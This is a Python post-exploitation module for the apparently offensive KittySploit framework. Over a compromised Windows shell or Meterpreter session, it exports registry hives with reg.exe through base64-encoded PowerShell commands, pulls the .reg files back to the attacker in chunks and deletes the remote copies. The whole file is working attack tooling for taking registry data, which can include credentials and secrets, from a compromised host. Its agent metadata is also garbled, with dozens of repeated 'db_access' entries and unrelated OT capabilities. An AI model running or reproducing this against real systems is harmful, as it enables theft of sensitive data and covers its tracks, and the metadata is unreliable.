#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Export selected Windows registry hives with reg.exe on a shell or Meterpreter session.
.reg files are downloaded through the session and saved under ./output.
"""

from kittysploit import *
import base64
import os
import re
import time

_LOCAL_OUT = "output"
_FILE_MARKER = "__KS_FILE__:"


class Module(Post):
    _AUTO_CLEANUP = True

    __info__ = {
        "name": "Windows Backup Registry",
        "description": (
            "Export selected registry hives (HKCU, HKLM, HKCR, HKU, HKCC) using reg.exe "
            "on a Windows shell or Meterpreter session, then download the .reg files."
        ),
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL],
        "references": [
            "https://attack.mitre.org/techniques/T1112/",
        ],
    'agent': {
        'risk': 'intrusive',
        'effects': ['active_exploitation'],
        'expected_requests': 3,
        'reversible': False,
        'approval_required': True,
        'produces': ['risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 's7comm', 'from_detail': ''},
                                   {'capability': 'ot_assets', 'from_detail': ''},
                                   {'capability': 'ot_assets', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': [],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    out_dir = OptString("", "Remote directory for .reg exports (default: %TEMP%)", False)
    chunk_kb = OptInteger(256, "Chunk size in kilobytes for session reads", False)
    hkcu = OptBool(True, "Export HKEY_CURRENT_USER", False)
    hklm = OptBool(False, "Export HKEY_LOCAL_MACHINE (administrator required)", False)
    hkcr = OptBool(False, "Export HKEY_CLASSES_ROOT", False)
    hku = OptBool(False, "Export HKEY_USERS (administrator required)", False)
    hkcc = OptBool(False, "Export HKEY_CURRENT_CONFIG (administrator required)", False)

    def _execute_cmd(self, command: str) -> str:
        if not command:
            return ""
        output = self.cmd_execute(command)
        return output.strip() if output else ""

    def _encode_powershell(self, script: str) -> str:
        return base64.b64encode(script.encode("utf-16le")).decode("ascii")

    def _run_powershell(self, script: str) -> str:
        encoded = self._encode_powershell(script)
        return self._execute_cmd(f"powershell -NoP -NonI -EncodedCommand {encoded}")

    def _remote_temp_dir(self) -> str:
        if str(self.out_dir or "").strip():
            return str(self.out_dir).strip().rstrip("\\")
        output = self._execute_cmd("echo %TEMP%")
        if output:
            return output.splitlines()[0].strip().rstrip("\\")
        return "C:\\Windows\\Temp"

    def _ps_single_quote(self, value: str) -> str:
        return str(value).replace("'", "''")

    def _bool_opt(self, val, default=False) -> bool:
        if val is None:
            return default
        if isinstance(val, bool):
            return val
        return str(val).strip().lower() in ("1", "true", "yes", "on")

    def _selected_hives(self):
        return {
            "HKCU": self._bool_opt(self.hkcu, True),
            "HKLM": self._bool_opt(self.hklm, False),
            "HKCR": self._bool_opt(self.hkcr, False),
            "HKU": self._bool_opt(self.hku, False),
            "HKCC": self._bool_opt(self.hkcc, False),
        }

    def _needs_admin(self) -> bool:
        hives = self._selected_hives()
        return any(hives[key] for key in ("HKLM", "HKU", "HKCC"))

    def _powershell_script(self, output_dir: str, hives: dict) -> str:
        out = self._ps_single_quote(output_dir)
        lines = [
            "$ErrorActionPreference = 'Stop'",
            f"$OutputDir = '{out}'",
            "if (-not (Test-Path -LiteralPath $OutputDir)) {",
            "    New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null",
            "}",
        ]
        for hive, enabled in hives.items():
            if not enabled:
                continue
            lines.extend([
                f"$dest = Join-Path $OutputDir '{hive}-registry.reg'",
                f"& reg.exe export {hive} $dest /y | Out-Null",
                f"if ($LASTEXITCODE -ne 0) {{ throw \"reg export {hive} failed with exit code $LASTEXITCODE\" }}",
                f"Write-Output '__KS_FILE__:' + $dest",
            ])
        return "\n".join(lines)

    def _int_opt(self, val, default, minimum=None):
        try:
            n = int(val)
        except Exception:
            n = default
        if minimum is not None and n < minimum:
            n = minimum
        return n

    def _remote_file_size(self, path: str) -> int:
        pq = self._ps_single_quote(path)
        ps = f"(Get-Item -LiteralPath '{pq}').Length"
        out = self._run_powershell(ps).strip()
        if not out:
            return 0
        tail = out.splitlines()[-1].strip()
        try:
            return int(tail)
        except ValueError:
            digits = re.sub(r"\D", "", tail)
            return int(digits) if digits else 0

    def _read_remote_chunk_b64(self, path: str, offset: int, length: int) -> bytes:
        pq = self._ps_single_quote(path)
        ps = f"""$fs = [IO.File]::OpenRead('{pq}')
try {{
  $null = $fs.Seek({int(offset)}, [IO.SeekOrigin]::Begin)
  $buf = New-Object byte[] {int(length)}
  $n = $fs.Read($buf, 0, {int(length)})
  if ($n -le 0) {{ '' }} else {{ [Convert]::ToBase64String($buf, 0, $n) }}
}} finally {{
  $fs.Close()
}}"""
        out = self._run_powershell(ps)
        clean = re.sub(r"\s+", "", out)
        if not clean:
            return b""
        return base64.b64decode(clean)

    def _pull_file_via_session(self, remote_path: str, local_path: str) -> bool:
        size = self._remote_file_size(remote_path)
        if size <= 0:
            print_error(f"Remote file is missing or empty: {remote_path}")
            return False

        chunk = max(1024, self._int_opt(self.chunk_kb, 256, None) * 1024)
        parts = []
        offset = 0
        while offset < size:
            n = min(chunk, size - offset)
            blob = self._read_remote_chunk_b64(remote_path, offset, n)
            if len(blob) != n:
                print_error(f"Chunk read mismatch at offset {offset} (expected {n} bytes, got {len(blob)}).")
                return False
            parts.append(blob)
            offset += n

        parent = os.path.dirname(os.path.abspath(local_path))
        if parent:
            os.makedirs(parent, exist_ok=True)
        with open(local_path, "wb") as f:
            f.write(b"".join(parts))
        return True

    def _parse_remote_files(self, output: str):
        files = []
        for line in output.splitlines():
            line = line.strip()
            if line.startswith(_FILE_MARKER):
                files.append(line[len(_FILE_MARKER):].strip())
        return files

    def _cleanup_remote(self, paths):
        for path in paths:
            if not path:
                continue
            self._execute_cmd(f'del /f /q "{path}"')

    def check(self):
        hives = self._selected_hives()
        if not any(hives.values()):
            print_error("At least one registry hive must be selected")
            return False

        if self._needs_admin():
            admin_check = self._run_powershell(
                "([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent())"
                ".IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)"
            )
            if "True" not in admin_check:
                print_error("Administrator privileges are required for HKLM, HKU, or HKCC export")
                whoami = self._execute_cmd("whoami")
                if whoami:
                    print_warning(f"Current user: {whoami}")
                return False
            print_success("Administrator privileges confirmed")

        reg_check = self._execute_cmd("where reg")
        if not reg_check or "reg" not in reg_check.lower():
            print_error("reg.exe is not available on the target")
            return False

        return True

    def run(self):
        if not self.check():
            raise ProcedureError(FailureType.NotAccess, "Registry backup prerequisites not met")

        hives = self._selected_hives()
        selected = [name for name, enabled in hives.items() if enabled]
        temp_dir = self._remote_temp_dir()
        stamp = time.strftime("%Y%m%d_%H%M%S")
        local_dir = os.path.join(_LOCAL_OUT, f"backup_registry_{stamp}")
        os.makedirs(local_dir, exist_ok=True)

        print_status(f"Exporting registry hives: {', '.join(selected)}")
        result = self._run_powershell(self._powershell_script(temp_dir, hives))
        remote_files = self._parse_remote_files(result)

        if not remote_files:
            if re.search(r"(Exception|failed|reg export)", result, re.I):
                print_error(result or "Registry export failed without output")
                raise ProcedureError(FailureType.Unknown, "Registry export failed")
            raise ProcedureError(FailureType.Unknown, "No .reg files were produced")

        saved = []
        for remote_path in remote_files:
            base = os.path.basename(remote_path.replace("\\", "/")) or "registry.reg"
            local_path = os.path.join(local_dir, base)
            print_status(f"Downloading {remote_path}...")
            if not self._pull_file_via_session(remote_path, local_path):
                if self._AUTO_CLEANUP:
                    self._cleanup_remote(remote_files)
                raise ProcedureError(FailureType.Unknown, f"Failed to download {remote_path}")
            saved.append(local_path)
            if self._AUTO_CLEANUP:
                self._cleanup_remote([remote_path])

        print_success("Registry backup completed")
        for path in saved:
            rel = os.path.join(".", path)
            print_success(f"Saved {rel} ({os.path.getsize(path)} bytes)")
        return True
